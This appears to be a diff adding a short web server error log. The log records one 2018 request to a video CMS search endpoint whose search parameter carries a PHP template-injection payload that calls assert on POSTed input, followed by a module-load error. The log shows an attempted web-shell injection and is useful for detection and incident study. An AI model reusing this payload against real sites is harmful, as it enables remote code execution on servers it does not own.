@@ -1,0 +1,3 @@
+[ 2018-09-09T23:06:16+08:00 ] 140.143.157.254 /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+ERR: 无法加载模块:Vod-search
+
